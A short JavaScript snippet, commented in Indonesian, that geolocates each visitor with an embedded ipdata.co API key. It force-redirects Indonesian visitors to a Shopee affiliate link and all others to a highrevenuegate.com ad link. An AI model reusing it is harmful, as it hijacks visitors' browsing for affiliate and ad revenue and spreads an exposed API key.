// Mendapatkan URL saat ini
const currentUrl = window.location.href;

// Mengekstrak kata kunci pencarian dari URL
const searchParams = new URLSearchParams(currentUrl.split('?')[1]);
const keyword = searchParams.get('q');

// Mendapatkan IP negara menggunakan ipdata.co
fetch('https://api.ipdata.co/?api-key=70e96f8fcca842a575e8c9f10add9bc840d540def48c833f8d72249f')
  .then(response => response.json())
  .then(data => {
    const countryCode = data.country_code;

    // Jika negara adalah Indonesia, maka arahkan ke shopee.co.id
    if (countryCode === 'ID') {
      const redirectUrl = `https://shopee.co.id/search?filters=5%2C6%2C7&keyword=${keyword}`;
      window.location.replace(`https://shope.ee/an_redir?origin_link=${encodeURIComponent(redirectUrl)}&affiliate_id=11369620275&sub_id=RacunBelanja-14-03-20-23`);
    }
    // Jika negara bukan Indonesia, maka arahkan ke highrevenuegate.com
    else {
      window.location.replace('https://www.highrevenuegate.com/ix4w14mn00?key=0647c1ed9e0e63fde67b1b37272c2227');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });
